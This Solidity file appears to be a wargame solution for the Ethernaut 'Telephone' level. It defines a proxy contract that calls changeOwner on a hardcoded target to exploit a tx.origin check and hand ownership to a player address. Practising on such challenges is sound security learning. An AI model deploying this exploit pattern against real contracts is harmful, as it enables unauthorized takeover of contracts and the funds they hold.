// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Telephone.sol";

contract proxyTelephone {
  Telephone telephone;
  address addrTelephoneContract = 0x87c0b762A6151D48547ac381a821D72E9E97c26f;
    address player = 0x5Cac6Bb8A9Bf771e32207bd6F9986ADb6e8bA37c;

  address public owner;

  constructor() public {
    telephone = Telephone(addrTelephoneContract);
  }

  function sendChangeOwner() public {
    
    
    telephone.changeOwner(player);
    }
  }
